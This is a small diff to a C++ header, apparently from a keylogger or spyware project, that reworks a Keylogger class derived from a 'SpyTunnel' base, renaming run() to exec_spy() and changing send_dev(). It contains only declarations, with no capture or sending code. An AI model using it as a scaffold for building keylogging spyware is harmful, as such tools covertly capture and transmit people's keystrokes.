@@ -7,12 +7,13 @@
 class Keylogger : public SpyTunnel {
 public:
     Keylogger() = default;
-    void run() override;
     void set_layout(const std::string& __layout);
 protected:
     std::string layout_;
+
+    void exec_spy() override;
     void spawn_window() override;
-    void send_dev() override;
+    void send_dev();
 };
 
 #endif // KEYLOGGER_HPP
